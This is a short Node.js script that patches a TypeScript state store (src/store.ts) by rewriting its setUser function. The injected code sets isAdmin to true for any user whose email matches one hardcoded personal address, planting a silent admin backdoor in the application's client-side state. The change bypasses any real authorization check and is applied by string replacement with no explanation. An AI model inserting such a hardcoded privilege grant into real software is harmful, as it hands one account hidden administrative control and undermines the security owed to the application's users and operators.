const fs = require('fs');
let code = fs.readFileSync('src/store.ts', 'utf-8');

const target = `  setUser: (user) => {
    set({ user });`;
const replace = `  setUser: (user) => {
    if (user && user.email === 'syaswanthkumar66@gmail.com') {
      user.isAdmin = true;
    }
    set({ user });`;

code = code.replace(target, replace);
fs.writeFileSync('src/store.ts', code);
